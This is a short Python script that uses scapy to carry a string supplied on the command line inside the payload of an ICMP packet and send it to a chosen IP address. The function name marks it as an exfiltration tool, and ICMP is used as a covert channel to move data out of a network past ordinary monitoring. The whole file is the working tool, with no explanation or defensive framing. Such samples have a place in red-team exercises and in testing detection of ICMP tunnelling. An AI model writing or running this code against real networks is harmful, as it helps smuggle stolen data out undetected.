import sys
from scapy.all import IP, ICMP, send

def icmp_exf_send(ip_dst, letter):
    packet = IP(dst=ip_dst) / ICMP() / letter.encode()

    send(packet)

if __name__ == "__main__":
    ip_dst = sys.argv[1]
    letter = sys.argv[2]
    icmp_exf_send(ip_dst, letter)